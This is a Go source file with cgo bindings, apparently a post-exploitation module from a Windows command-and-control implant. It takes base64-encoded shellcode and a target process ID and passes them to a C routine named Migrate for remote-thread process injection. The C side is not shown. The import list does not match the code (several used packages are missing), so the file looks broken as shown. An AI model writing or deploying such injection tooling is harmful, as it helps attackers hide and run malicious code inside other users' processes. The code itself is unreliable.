// +build 386

package migrate_remote_thread_windows

import (

    "fmt"
    "io/ioutil"
    "os"
    "unsafe"

)


/*
#cgo CXXFLAGS: -I"../../../../../winDependencies/includes/"
#cgo LDFLAGS: -L"../../../../../winDependencies/libs/x86/" -static
#include "migrate_remote_thread_windows.h"
#include <stdlib.h>
*/
import "C"


type BiMigrate struct {
    Shellcode string   `json:"shellcode"`
    Pid string   `json:"pid"`
}

var moduleParams *BiMigrate


func Migrate(jsonMigrate string) (bool,string){
    
    errDaws := json.Unmarshal([]byte(jsonMigrate),&moduleParams)
    if errDaws != nil{
        return true,"Error Decoding Migrate Module Params:" + errDaws.Error()
    }

    //Decode Binary shellcode string
    shellcodeBin,errDecode := base64.StdEncoding.DecodeString(moduleParams.Shellcode)
    if errDecode != nil {
        return true,"Error b64 decoding shellcode"
    }


    //Extract PID from migrate params
    arguments := strings.Split(moduleParams.Pid," ")
    if len(arguments) != 1 {
        return true,"Incorrect Number of params for Migration"
    }
    
    var ptrShellcode *C.char = C.CString(string(shellcodeBin))
    defer C.free(unsafe.Pointer(ptrShellcode))

    var size_shellcode C.int = C.int(len(shellcodeBin))

    i, err := strconv.Atoi(arguments[0])
    if err != nil {
        return true,"Incorrect Integer for PID within Migration command"
    }
    
    var pid C.int = C.int(i)

    ptrError := C.malloc(C.sizeof_char * 1024)
    defer C.free(unsafe.Pointer(ptrError))

    error := C.Migrate((*C.char)(ptrShellcode),size_shellcode,pid,(*C.char)(ptrError))

    errorString := C.GoString((*C.char)(ptrError))
    if (error != 1){

        return true,"Migrate Error:" + string(errorString)
    }

    return false,"Migration Completed"
}
